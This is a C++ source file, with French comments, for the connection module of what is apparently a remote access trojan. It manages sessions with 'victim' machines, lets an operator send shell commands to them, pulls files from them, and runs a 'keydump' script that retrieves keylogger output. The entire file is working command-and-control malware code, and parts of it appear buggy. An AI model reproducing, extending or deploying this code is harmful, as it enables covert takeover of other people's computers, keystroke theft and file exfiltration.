//
// Created by Berlingot on 2023-04-20.
//

#include "Connexion.h"

Connexion* Connexion::connexionptrreference;

Connexion::Connexion(const char * adresseIP, unsigned short port, ConnexionType ConnexionTypearg) {
    switch (ConnexionTypearg) {
        case ConnexionType::INBOUND:
            INBOUNDconnexion(adresseIP,port);
            break;
        case ConnexionType::OUTBOUND:
            OUTBOUNDconnexion(adresseIP,port);
            break;
        default:break;
    }
}

void Connexion::INBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){

        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (_socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (_socket.AcceptConnection(_socket) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;
                    connexionptrreference = this;
                    this->adresseIP.sin_addr.s_addr = inet_addr("127.0.0.1"); //Broadcast locally
                    this->adresseIP.sin_port = htons(13337); //Port
                    this->adresseIP.sin_family = AF_INET; //IPv4 Socket
                    listenning();
                    }
                }
        }
    }
}
/*
if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;
            if (socket.Listen(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout << "Écoute du Socket complété"<<std::endl;
                //new connection
                MyPNet::Socket connectionACible;
                std::cout<<"Lancement de l'écoute pour la connetion d'une victime" << std::endl;

                if (socket.AcceptConnection(connectionACible) == MyPNet::PResult::P_Success){
                    std::cout<<"Victime connecté" << std::endl;

                    std::string buffer = "";
                    uint32_t  a(3), b(2), c(1);
                    MyPNet::Packet packet;
                    while(true){
                        MyPNet::PResult result = connectionACible.ReceivePaquets(packet);
                        if (result != MyPNet::PResult::P_Success){
                            break;
                        }
                        if (!ProcessPacket(packet)){
                            break;
                        }
                    }
                }
            }

            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;
*/

void Connexion::OUTBOUNDconnexion(const char *adresseIP, unsigned short port) {
    if(MyPNet::Network::Initialize()){
        if(_socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            std::cout << std::endl<< "Tentative de connexion au pirate"<<std::endl;
            while(pirateTrouvee == false) {
                if (_socket.ConnectTo(MyPNet::IPEndpoint(adresseIP, port)) == MyPNet::PResult::P_Success) {
                    pirateTrouvee = true;
                    std::cout << "Connexion établie" << std::endl;
                    return;
                } else { std::cout << std::endl << "Tentative de connexion échoué." << std::endl << "Nouvelle tentative dans 5 secondes" << std::endl; sleep(5);}
            }
        }
    }
}

bool Connexion::listenning() {

    listenersocket = socket(AF_INET, SOCK_STREAM, NULL);
    int result;
    result = bind(listenersocket, (SOCKADDR*)&adresseIP, sizeof(adresseIP));
    if(result){ // il y a erreur lors du bind
        std::string ErrorMsg = "Failed to bind" + std::to_string(WSAGetLastError());
        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
        exit(1);    }
    result = listen(listenersocket, SOMAXCONN);
    if (result) { // Echeck de l'écoute du socket
        std::string ErrorMsg = "Failed to listen on listening socket. Winsock Error:" + std::to_string(WSAGetLastError());
        MessageBoxA(NULL, ErrorMsg.c_str(), "Error", MB_OK | MB_ICONERROR);
        exit(1);
    }

    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)TransmitionDePaquetThread, NULL, NULL, NULL);
    return false;
}//https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170

void Connexion::TransmitionDePaquetThread() { ///ListenerThread
    std::cout<<"TransmitionDePaquetThread" << std::endl;
    while (true)
    {
        for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++) //for each connection...
        {
            if (connexionptrreference->activeconnection[i]->gestionpacket.HasPendingPackets()) //If there are pending packets for this connection's packet manager
            {
                MyPNet::Packet p = connexionptrreference->activeconnection[i]->gestionpacket.Retrieve(); //Retrieve packet from packet manager
                if (!connexionptrreference->sendallpack(i, p.bufferL, p.size)) //send packet to connection
                {
                    std::cout << "Failed to send packet to ID: " << i << std::endl; //Print out if failed to send packet
                }
                delete p.bufferL; //Clean up buffer from the packet p
            }
        }
        Sleep(5);
    }
}

bool Connexion::sendallpack(int ID, char *data, int totalbytes) {

    int bytessent = 0; //Holds the total bytes sent
    while (bytessent < totalbytes) //While we still have more bytes to send
    {
        int RetnCheck = send(activeconnection[ID]->socket, data + bytessent, totalbytes - bytessent, NULL); //Try to send remaining bytes
        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to send bytes
            return false; //Return false - failed to sendall
        bytessent += RetnCheck; //Add to total bytes sent
    }
    return true; //Success!
}

void Connexion::ListenForNewConnection() {
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)EcouteThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
}

void Connexion::EcouteThread() {
    while (true)
    {                                                                                                                                       //TODO CHU ICITTEEE HAAAAAAAAAAAAAAA
        SOCKET newConnectionSocket = accept(connexionptrreference->listenersocket, (SOCKADDR*)&connexionptrreference->adresseIP, &connexionptrreference->addresselen); //Accept a new connection
        if (newConnectionSocket == 0) //If accepting the client connection failed
        {
            std::cout << "Failed to accept the client's connection." << std::endl;
        }
        else //If client connection properly accepted
        {
            std::lock_guard<std::mutex> lock(connexionptrreference->connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
            int NewConnectionID = connexionptrreference->activeconnection.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
            if (connexionptrreference->UnusedConnections > 0) //If there is an unused connection that this client can use
            {
                for (size_t i = 0; i < connexionptrreference->activeconnection.size(); i++) //iterate through the unused connections starting at first connection
                {
                    if (connexionptrreference->activeconnection[i]->ActiveConnection == false) //If connection is not active
                    {
                        connexionptrreference->activeconnection[i]->socket = newConnectionSocket;
                        connexionptrreference->activeconnection[i]->ActiveConnection = true;
                        NewConnectionID = i;
                        connexionptrreference->UnusedConnections -= 1;
                        break;
                    }
                }
            }
            else //If no unused connections available... (add new connection to the socket)
            {
                std::shared_ptr<ActiveConnexionVerification> newConnection(new ActiveConnexionVerification(newConnectionSocket));
                connexionptrreference->activeconnection.push_back(newConnection); //push new connection into vector of connections
            }
            //std::cout << "Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(connexionptrreference->adresseIP.sin_addr) << std::endl;
            _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ConnexionHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
        }
    }
}

void Connexion::ConnexionHandlerThread(int ID) {
    MyPNet::PacketType packettype;
    while (true)
    {
        if (!connexionptrreference->GetPacketType(ID, packettype)) //Get packet type
            break; //If there is an issue getting the packet type, exit this loop
        if (!connexionptrreference->ProcessPacket(ID, packettype)) //Process packet (packet type)
            break; //If there is an issue processing the packet, exit this loop
    }
    std::cout << "Lost connection to client ID: " << ID << std::endl;
    connexionptrreference->DisconnectClient(ID); //Disconnect this client and clean up the connection if possible
    return;
}

bool Connexion::GetPacketType(int ID, MyPNet::PacketType &_packettype) {
    int packettype;
    if (!Getint32_t(ID, packettype)) //Try to receive packet type... If packet type fails to be recv'd
        return false; //Return false: packet type not successfully received
    _packettype = (MyPNet::PacketType)packettype;
    return true;//Return true if we were successful in retrieving the packet type
}

bool Connexion::Sendint32_t(int ID, int32_t _int32_t) {
    _int32_t = htonl(_int32_t); //Convert long from Host Byte Order to Network Byte Order
    if (!sendallpack(ID, (char*)&_int32_t, sizeof(int32_t))) //Try to send long (4 byte int)... If int fails to send
        return false; //Return false: int not successfully sent
    return true; //Return true: int successfully sent
    }

bool Connexion::Getint32_t(int ID, int32_t &_int32_t) {
    if (!recvallpack(ID, (char*)&_int32_t, sizeof(int32_t))) //Try to receive long (4 byte int)... If int fails to be recv'd
        return false; //Return false: Int not successfully received
    _int32_t = ntohl(_int32_t); //Convert long from Network Byte Order to Host Byte Order
    return true;//Return true if we were successful in retrieving the int
}

bool Connexion::recvallpack(int ID, char *data, int totalbytes) {
    int bytesreceived = 0; //Holds the total bytes received
    while (bytesreceived < totalbytes) //While we still have more bytes to recv
    {
        int RetnCheck = recv(activeconnection[ID]->socket, data, totalbytes - bytesreceived, NULL); //Try to recv remaining bytes
        if (RetnCheck == SOCKET_ERROR) //If there is a socket error while trying to recv bytes
            return false; //Return false - failed to recvall
        bytesreceived += RetnCheck; //Add to total bytes received
    }
    return true; //Success!

}

void Connexion::DisconnectClient(int ID) {
    currentSessionID = -1;
    std::lock_guard<std::mutex> lock(connectionMgr_mutex); //Lock connection manager mutex since we are possible removing element(s) from the vector
    if (activeconnection[ID]->ActiveConnection == false) //If connection has already been disconnected?
    {
        return; //return - this should never happen, but just in case...
    }
    activeconnection[ID]->gestionpacket.Clear(); //Clear out all remaining packets in queue for this connection
    activeconnection[ID]->ActiveConnection = false; //Update connection's activity status to false since connection is now unused
    closesocket(activeconnection[ID]->socket); //Close the socket for this connection
    if (ID == (activeconnection.size() - 1)) //If last connection in vector.... (we can remove it)
    {
        activeconnection.pop_back(); //Erase last connection from vector
        //After cleaning up that connection, check if there are any more activeconnection that can be erased (only connections at the end of the vector can be erased)

        for (size_t i = activeconnection.size() - 1; i >= 0 && activeconnection.size() > 0; i--)
        {
            if (activeconnection[i]->ActiveConnection) //If connection is active we cannot remove any more connections from vector
                break;
            //If we have not broke out of the for loop, we can remove the current indexed connection
            activeconnection.pop_back(); //Erase last connection from vector
            UnusedConnections -= 1;
        }
    }
    else
    {
        UnusedConnections += 1;
    }
}

bool Connexion::ProcessPacket(int ID, MyPNet::PacketType _packettype) {
    switch (_packettype)
    {

        case MyPNet::PacketType::Instruction: //Packet Type: chat message
        {
            std::string message; //string to store our message we received
            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
                return false; //If we do not properly get the chat message, return false
            //Next we need to send the message out to each user
            General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 1);
            break;
        }

        case MyPNet::PacketType::CMDCommand:
        {
            std::string message; //string to store our message we received
            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
                return false; //If we do not properly get the chat message, return false
            //Next we need to send the message out to each user

            General::outputMsg(message, 3);

            break;
        }

        case MyPNet::PacketType::Warning:
        {
            std::string message; //string to store our message we received
            if (!GetString(ID, message)) //Get the chat message and store it in variable: Message
                return false; //If we do not properly get the chat message, return false
            //Next we need to send the message out to each user
            General::outputMsg("ID [" + std::to_string(ID) + "]: " + message, 2);
            break;
        }

        case MyPNet::PacketType::FileTransferRequestFile:
        {
            std::string FileName; //string to store file name
            if (!GetString(ID, FileName)) //If issue getting file name
                return false; //Failure to process packet

            activeconnection[ID]->fichier.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
            if (!activeconnection[ID]->fichier.infileStream.is_open()) //If file is not open? (Error opening file?)
            {
                std::cout << "Client: " << ID << " requested file: " << FileName << ", but that file does not exist." << std::endl;
                return true;
            }

            activeconnection[ID]->fichier.fileName = FileName; //set file name just so we can print it out after done transferring
            activeconnection[ID]->fichier.fileSize = activeconnection[ID]->fichier.infileStream.tellg(); //Get file size
            activeconnection[ID]->fichier.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
            activeconnection[ID]->fichier.fileOffset = 0; //Update file offset for knowing when we hit end of file

            if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
                return false;
            break;
        }
        case MyPNet::PacketType::FileTransferRequestNextBuffer:
        {
            if (!HandleSendFile(ID)) //Attempt to send byte buffer from file. If failure...
                return false;
            break;
        }
        default: //If packet type is not accounted for
        {
            std::cout << "Unrecognized packet: " << (int32_t)_packettype << std::endl; //Display that packet was not found
            break;
        }
    }
    return true;
}

bool Connexion::GetString(int ID, std::string &_string) {
    int32_t bufferlength; //Holds length of the message
    if (!Getint32_t(ID, bufferlength)) //Get length of buffer and store it in variable: bufferlength
        return false; //If get int fails, return false
    char * buffer = new char[bufferlength + 1]; //Allocate buffer
    buffer[bufferlength] = '\0'; //Set last character of buffer to be a null terminator so we aren't printing memory that we shouldn't be looking at
    if (!recvallpack(ID, buffer, bufferlength)) //receive message and store the message in buffer array. If buffer fails to be received...
    {
        delete[] buffer; //delete buffer to prevent memory leak
        return false; //return false: Fails to receive string buffer
    }
    _string = buffer; //set string to received buffer message
    delete[] buffer; //Deallocate buffer memory (cleanup to prevent memory leak)
    return true;//Return true if we were successful in retrieving the string

}

bool Connexion::HandleSendFile(int ID) {

    if (activeconnection[ID]->fichier.fileOffset >= activeconnection[ID]->fichier.fileSize) //If end of file reached then return true and skip sending any bytes
        return true;
    if (!SendPacketType(ID, MyPNet::PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
        return false;

    activeconnection[ID]->fichier.remainingBytes = activeconnection[ID]->fichier.fileSize - activeconnection[ID]->fichier.fileOffset; //calculate remaining bytes
    if (activeconnection[ID]->fichier.remainingBytes > activeconnection[ID]->fichier.buffersize) //if remaining bytes > max byte buffer
    {
        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize); //read in max buffer size bytes
        if (!Sendint32_t(ID, activeconnection[ID]->fichier.buffersize)) //send int of buffer size
            return false;
        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.buffersize)) //send bytes for buffer
            return false;
        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.buffersize; //increment fileoffset by # of bytes written
    }
    else
    {
        activeconnection[ID]->fichier.infileStream.read(activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes); //read in remaining bytes
        if (!Sendint32_t(ID, activeconnection[ID]->fichier.remainingBytes)) //send int of buffer size
            return false;
        if (!sendallpack(ID, activeconnection[ID]->fichier.buffer, activeconnection[ID]->fichier.remainingBytes)) //send bytes for buffer
            return false;
        activeconnection[ID]->fichier.fileOffset += activeconnection[ID]->fichier.remainingBytes; //increment fileoffset by # of bytes written
    }

    if (activeconnection[ID]->fichier.fileOffset == activeconnection[ID]->fichier.fileSize) //If we are at end of file
    {
        if (!SendPacketType(ID, MyPNet::PacketType::FileTransfer_EndOfFile)) //Send end of file packet
            return false;
        //Print out data on server details about file that was sent
        std::cout << std::endl << "File sent: " << activeconnection[ID]->fichier.fileName << std::endl;
        std::cout << "File size(bytes): " << activeconnection[ID]->fichier.fileSize << std::endl << std::endl;
    }
    return true;
}

bool Connexion::SendPacketType(int ID, MyPNet::PacketType _packettype) {
    if (!Sendint32_t(ID, (int32_t)_packettype)) //Try to send packet type... If packet type fails to send
        return false; //Return false: packet type not successfully sent
    return true; //Return true: packet type successfully sent
    }

void Connexion::HandleInput() {

    std::string userinput;
    int inputInt;
    currentSessionID = -1;
    while (true)
    {
        std::getline(std::cin, userinput);

        if (currentSessionID == -1)			//handle command while not having selected a client
        {
            if (General::processParameter(userinput, "connect"))
            {
                inputInt = atoi(userinput.c_str());
                int tempInt = activeconnection.size() - 1;
                if (inputInt > tempInt)
                    General::outputMsg("Session doesn't exist.", 2);
                else
                {
                    currentSessionID = inputInt;
                    General::outputMsg("Connected to Session " + std::to_string(currentSessionID), 1);
                }
                inputInt = 0;
                userinput.empty();
            }
            //else if (General::processParameter(userinput, "broadcast"))		//broadcasts commands to all clients
            //{
                //General::outputMsg("Entering broadcast mode. To disable, type 'exitSession'", 1);
              //  currentSessionID = -2;
            //}
            else if (General::processParameter(userinput, "listClients"))	//counts clients (TODO: list clients)
            {
                if (activeconnection.size() <= 0)
                {
                    General::outputMsg("No Clients connected", 2);
                }
                else
                {
                    General::outputMsg("Listing all Clients, Connected: " + std::to_string(activeconnection.size()), 1);
                }
            }
            else
                General::outputMsg("Please connect to a session with 'connect'", 2);
        }


        else						//handle command when client is selected
        {
            if (userinput == "exitSession")
            {
                General::outputMsg("Exited Session " + std::to_string(currentSessionID), 1);
                currentSessionID = -1;
            }

            else if (General::processParameter(userinput, "switchSession"))
            {
                inputInt = atoi(userinput.c_str());
                int tempInt = activeconnection.size() - 1;
                if (inputInt > tempInt)
                    General::outputMsg("Session doesn't exist.", 2);
                else
                {
                    currentSessionID = inputInt;
                    General::outputMsg("Switched to Session " + std::to_string(currentSessionID), 1);
                }
                inputInt = 0;
                userinput.empty();
            }

            else if (userinput.find("remoteControl") != std::string::npos)
            {
                General::cmdMode = !General::cmdMode;
                std::cout << currentSessionID << userinput;
                SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
            }
            else if (General::processParameter(userinput, "script"))
            {
                handleScript(userinput);
            }
            else if (General::cmdMode)
            {
                SendString(currentSessionID, userinput, MyPNet::PacketType::CMDCommand);
            }
            else
            {
                SendString(currentSessionID, userinput, MyPNet::PacketType::Instruction);
            }
        }
    }
}

void Connexion::SendString(int ID, std::basic_string<char> _string, MyPNet::PacketType _packettype) {//todo check la conversion de string en basic string

    MyPNet::Message message(_string);
    if (ID == -2)
    {
        for (int i = 0; i < activeconnection.size(); i++)
        {
            activeconnection[i]->gestionpacket.Append(message.toPacket(_packettype));
        }
    }
    else
    {
        activeconnection[ID]->gestionpacket.Append(message.toPacket(_packettype));
    }
}

void Connexion::handleScript(std::string script) {
    General::outputMsg("Executing script", 1);

    SendString(currentSessionID, (std::string)"remoteControl cmd", MyPNet::PacketType::Instruction);
    Sleep(2000);
    if (General::processParameter(script, "keydump"))
    {
        General::outputMsg("Dumping Keylogs from " + script, 1);
        SendString(currentSessionID, "type " + script, MyPNet::PacketType::CMDCommand);
    }
    else
    {
        General::outputMsg("Script not recognized", 2);
    }

    SendString(currentSessionID, (std::string)"remoteControl", MyPNet::PacketType::Instruction);
}
